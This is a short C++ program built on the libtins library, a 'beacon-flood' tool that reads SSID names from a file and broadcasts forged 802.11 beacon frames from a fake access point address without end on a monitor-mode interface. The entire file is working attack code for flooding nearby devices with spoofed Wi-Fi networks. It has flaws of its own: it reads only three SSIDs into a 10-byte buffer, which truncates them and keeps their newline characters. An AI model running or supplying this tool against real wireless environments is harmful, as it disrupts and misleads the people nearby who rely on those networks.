#include <iostream>
#include <unistd.h>
#include <list>
#include <tins/tins.h>

using namespace std;
using namespace Tins;

void usuage() {
    printf("syntax : beacon-flood <interface> <ssid-list-file>");
    printf("sample : beacon-flood mon0 ssid-list.txt");
}

int main(int argc, char *argv[])
{
    if (argc != 3) {
        usuage();
        return -1;
    }

    FILE *fp;
    char buff[10];
    list<string> ssidList;
    char *dev = argv[1];
    char *filename = argv[2];

    if ((fp = fopen(filename, "r")) == NULL) {
    	printf("Can't open file.\n");
        exit(1);
    }

    for (int i=1; i<=3; i++) {
    	fgets(buff, sizeof(buff), fp);
    	ssidList.push_back(buff);
    }
    fclose(fp);

    list<string>::iterator it = ssidList.begin();

    while (true) {
        RadioTap tap;

        Dot11::address_type ap = "11:11:11:11:11:11";
        Dot11::address_type broadcast = "ff:ff:ff:ff:ff:ff";
        Dot11Beacon beacon(broadcast, ap);
        beacon.addr4(ap);
        beacon.ssid(*it);
        beacon.ds_parameter_set(10);
        beacon.supported_rates({ 1.0f, 5.5f, 11.0f });
        tap.inner_pdu(beacon);

        PacketSender sender(dev);
        sender.send(tap);
        usleep(100000);

        if (++it == ssidList.end())
            it = ssidList.begin();
    }
}
